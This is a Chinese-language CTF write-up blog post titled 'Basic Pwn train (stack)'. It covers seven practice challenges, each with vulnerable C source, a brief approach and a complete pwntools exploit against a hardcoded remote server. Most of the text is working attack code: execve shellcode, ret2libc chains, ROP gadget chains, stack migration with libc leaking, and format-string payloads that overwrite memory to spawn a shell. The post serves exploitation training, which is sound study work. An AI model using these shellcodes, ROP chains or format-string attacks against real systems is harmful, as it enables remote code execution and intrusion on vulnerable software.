---
title: Basic Pwn train (stack)
date: 2018-04-10 15:17:38
tags: pwn
layout: post
---
Basic Pwn train (stack)

<!--more-->


# Basic Pwn train (stack)
源码和payload可以在我的git找到：

https://github.com/B3t4M3Ee/banana/tree/master/Pwn

## ret2sc
```c
#include <stdio.h>
char name[50];
int main(){
    setvbuf(stdout,0,2,0);
    printf("Name:");
    read(0,name,50);
    char buf[20];
    printf("Try your best:");
    gets(buf);
    return ;
}
```
checksec pwn

发现没有开任何保护

我们可以看到有两次输入

第二次输入有个buffer overflow

所以我们可以



利用第一次输入写入shellcode

第二次覆盖返回地址返回到第一次的shellcode


可以构造exploit：

```python    
from pwn import *
p=remote('121.42.189.18',10003)
offset=32
shellcode='\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'    
log.info(len(shellcode))
payload=shellcode
p.recv()
p.sendline(payload)
p.recv()
p.sendline('A'*offset+p32(0x804A060))
p.interactive();
```
## ret2lib
```c
#include <stdio.h>

void See_something(unsigned int addr){
    int *address ;
    address = (int *)addr ;
    printf("The content of the address : %p\n",*address);
};

void Print_message(char *mesg){
    char buf[48];
    strcpy(buf,mesg);
    printf("Your message is : %s",buf);
}

int main(){
    char address[10] ;
    char message[256];
    unsigned int addr ;
    puts("###############################");
    puts("Do you know return to library ?");
    puts("###############################");
    puts("What do you want to see in memory?");
    printf("Give me an address (in dec) :");
    fflush(stdout);
    read(0,address,10);
    addr = strtol(address);
    See_something(addr) ;
    printf("Leave some message for me :");
    fflush(stdout);
    read(0,message,256);
    Print_message(message);
    puts("Thanks you ~");
    return 0 ;
}

```
源代码如上
只开了NX保护
有两次输入
No1：输入一个地址 返回其上内容 可以leak libc addr

No2：输入data将会strcpy到栈上 可以buffer overflow 


思路：

    利用第一个输入点泄露system地址
    第二个输入点利用buffer overflow 构造system 的 function call

exploit：
```
    from pwn import *
    p=remote('121.42.189.18',10004)
    printf_got=134520848
    offset=60
    print p.recvrepeat(1)
    p.sendline(str(134520848))
    data= p.recvuntil('\n')
    print data[-11:]
    printf_addr=int(data[-11:],16)
    log.info(hex(printf_addr))
    libc=ELF('./libc6_2.23-0ubuntu9_i386.so')
    base=printf_addr-libc.symbols['printf']
    libc.address=base
    bash=libc.search('/bin/sh').next()
    system_addr=libc.symbols['system']
    payload='A'*offset+p32(libc.symbols['system'])+p32(0xdeadbeef)+p32(bash)
    p.sendline(payload)
    p.interactive();
```
    

## easyrop
```c
#include <stdio.h>

int main(){
    char buf[20];
    puts("ROP is easy is'nt it ?");
    printf("Your input :");
    fflush(stdout);
    read(0,buf,100);
}
```
保护只开了NX

但是发现下载的demo是static编译的
so

>ROPgadget --binary pwn3

//也可以用one_gadget


拥有了大量gadget的我们可以利用各种gadget
构造一次systemcall

![](/int0x80.png)

```python
from pwn import *
p=remote('121.42.189.18',10005)
p.recv()
bss=ELF('./pwn3').bss()
int80=0x080493e1
pppr=0x0806e850
eax_ret=0x080bae06
elf=ELF('./pwn3')
offset=32
pop_edx_ret=0x0806e82a
mov_esp_exc_ret=0x080bb066
mov_ptr_eax_edx_ret=0x0807b301
payload=offset*'A'+p32(pop_edx_ret)+p32(0x6e69622f)+p32(eax_ret)+p32(bss)+p32(mov_ptr_eax_edx_ret)+p32(pop_edx_ret)+p32(0x68732f2f)+p32(eax_ret)+p32(bss+4)+p32(mov_ptr_eax_edx_ret)+p32(eax_ret)+p32(11)+p32(pppr)+p32(0)+p32(0)+p32(bss)+p32(int80)
p.sendline(payload)
p.interactive();
```

后来发现同类的题目可以用one_gadget秒杀。。。

## migration

```c
#include <stdio.h>
int count = 1337 ;
int main(){
    if(count != 1337)
        _exit(1);
    count++;
    char buf[40];
    setvbuf(stdout,0,2,0);
    puts("Try your best :");
    read(0,buf,64);
    return ;    
}
```
看着名字感觉应该是关于 stack migration

read()有buffer overflow 

但是只有5*4字节
发现read+3参数+ret_addr刚好5个

我们可以利用bss上的空闲地带进行
stack migration

利用ropgadget很容易发现了leave_ret
pop_ret

于是思路：

    利用stack migration 泄露整个libc
    得到system，get
    然后构造两次function call
    第一次写/bin/sh
    第二次call system

exploit:

```python
from pwn import *
offset=44
leave_ret=0x08048503
pop_ebx_ret=0x0804836d
read_plt=0x8048380
puts_plt=0x8048390
elf=ELF('./pwn')
main=elf.symbols['main']
bss=elf.bss()
buf1=bss+0xa00
buf2=bss+0xc00
p=process('./pwn')
p=remote("121.42.189.18",10006)
p.recvline();
payload='Y'*40+p32(buf1)+p32(read_plt)+p32(leave_ret)+p32(0)+p32(buf1)+p32(200)
p.send(payload)

def leak(addr):
    global buf1,buf2,delay
	buf1,buf2 =buf2,buf1
	payload=p32(buf1)+p32(puts_plt)+p32(pop_ebx_ret)+p32(addr)+p32(read_plt)+p32(leave_ret)+p32(0)+p32(buf1)+p32(200)
	p.sendline(payload)
	data=p.recvrepeat(0.1)[:-1]+"\x00"
	return data

ptr_libc=leak(0x8049ff0)[:4]
d=DynELF(leak,main,elf=elf)
system=d.lookup('system','libc')
gets=d.lookup('gets','libc')
p.sendline(p32(0xdeadbeef)+p32(gets)+p32(system)+p32(buf1)+p32(buf1+4))
p.interactive();

```

## crack
```c
#include <stdio.h>
#include <unistd.h>
#include <time.h>
#include <stdlib.h>
unsigned int password ;
int main(){

    setvbuf(stdout,0,2,0);
    char buf[100];
    char input[16];
    int fd ;
    srand(time(NULL));
    fd = open("/dev/urandom",0);
    read(fd,&password,4);
    printf("What your name ? ");
    read(0,buf,99);
    printf("Hello ,");
    printf(buf);
    printf("Your password :");
    read(0,input,15);
    if(atoi(input) != password){
        puts("Goodbyte");
    }else{
        puts("Congrt!!");
        system("cat /home/crack/flag");
    }
}
```

开了NX和Canary

不过问题不大

源码本来就有

system("cat /home/crack/flag");

so 我们可以令

    atoi(input) == password

input我们可以控制但是password不知

可是在比较之前的几行有个fmtstr漏洞
    
    printf(buf);

我们可以利用这里的漏洞来更改password

so思路：
    
    利用fmtstr漏洞修改password
    
exploit：
```python
from pwn import *
p=remote('121.42.189.18',10007)
bss=0x804a048
log.info(hex(bss))
payload=fmtstr_payload(10,{bss:1})
p.sendline(payload)
p.recv()
p.interactive();

```

## xme
```c
#include <stdio.h>
int magic = 0 ;
int main(){
    char buf[0x100];
    setvbuf(stdout,0,2,0);
    puts("Please crax me !");
    printf("Give me magic :");
    read(0,buf,0x100);
    printf(buf);
    if(magic == 0xda){
        system("cat /home/craxme/flag");
    }else if(magic == 0xfaceb00c){
        system("cat /home/craxme/craxflag");
    }else{
        puts("You need be a phd");
    }

}
```

发现和crack基本一样
思路：
    利用fmtstr漏洞修改magic

exploit：
```python
from pwn import *
p=remote('121.42.189.18',10008)
bss=0x804a038
payload=fmtstr_payload(7,{bss:0xfaceb00c})
p.recv()
p.sendline(payload)
p.recv()
p.interactive();
```
不过老潘表示此题可以getshell
可能会有彩蛋吧

## print
```c
#include <stdio.h>
#include <unistd.h>
#include <string.h>

char buf[200] ;

void do_fmt(){
    while(1){
        read(0,buf,200);
        if(!strncmp(buf,"quit",4))
            break;
        printf(buf);
    }
    return ;
}

void play(){
    puts("=====================");
    puts("  Magic echo Server");
    puts("=====================");
    do_fmt();
    return;
}

int main(){
    setvbuf(stdout,0,2,0);
    play();
    return;
}
```
思路：

fmtstr漏洞可以

泄露libc可以泄露栈上__libc_start_main内的一个地址

根据函数内偏移算出share lib's base

泄露栈地址 推算各个返回地址的地址

和之前我遇到的fmtstr的不同之处是

buffer在bss上所以难以一次改写整个地址

但是因为有个quit的条件退出

只要不输入quit就不会退出

so

我们可以每次改一位

然后将do_fmt_ret改成system call

then 输入quit

exploit：
```python
from pwn import *
def lv_up(num):
    while(num<0 or num > 255):
		if(num<0):
			num=num+256;
		if(num>255):
			num=num-256;
	return num;
'''
elf=ELF('/lib/i386-linux-gnu/libc.so.6')
p=process('./4-4')
'''
elf=ELF('./libc6_2.23-0ubuntu9_i386.so')
p=remote('121.42.189.18',10009)
#'''
print p.recvline();
print p.recvline();
print p.recvline();
payload='%15$p%6$p'
p.sendline(payload)
data=p.recvuntil('8\n')
im=0xf7
im2=0xf3
leak_libc=int(data[:10],16)
leak_stack=int(data[10:-1],16)
log.info("leak_libc:%s",hex(leak_libc))
log.info("leak_stack:%s",hex(leak_stack))
leakfunc=leak_libc-im
base=leakfunc-elf.symbols['__libc_start_main']
elf.address=base
system=elf.symbols['system']
bash= elf.search('/bin/sh').next()
s1=system&0xff
s2=system&0xff00
s2=s2>>8
s3=system&0xff0000
s3=s3>>16
s4=system&0xff000000
s4=s4>>24
b1=bash&0xff
b2=bash&0xff00
b2=b2>>8
b3=bash&0xff0000
b3=b3>>16
b4=bash&0xff000000
b4=b4>>24
off=leak_stack&0xff;
off=off-16;
payload="%c%c%c%c%{}c%hhn%{}c%10$hhn".format(off,lv_up(s1-off-4))
p.sendline(payload)
p.recv()
off+=1;
payload="%c%c%c%c%{}c%hhn%{}c%10$hhn".format(off,lv_up(s2-off-4))
p.sendline(payload)
p.recv()
off+=1;
payload="%c%c%c%c%{}c%hhn%{}c%10$hhn".format(off,lv_up(s3-off-4))
p.sendline(payload)
p.recv()
off+=1;
payload="%c%c%c%c%{}c%hhn%{}c%10$hhn".format(off,lv_up(s4-off-4))
p.sendline(payload)
p.recv()
off+=5;
payload="%c%c%c%c%{}c%hhn%{}c%10$hhn".format(off,lv_up(b1-off-4))
p.sendline(payload)
p.recv()
off+=1;
payload="%c%c%c%c%{}c%hhn%{}c%10$hhn".format(off,lv_up(b2-off-4))
p.sendline(payload)
p.recv()
off+=1;
payload="%c%c%c%c%{}c%hhn%{}c%10$hhn".format(off,lv_up(b3-off-4))
p.sendline(payload)
p.recv();
off+=1;
payload="%c%c%c%c%{}c%hhn%{}c%10$hhn".format(off,lv_up(b4-off-4))
p.sendline(payload)
p.recv()
p.sendline("quit");
p.interactive();
```























































































































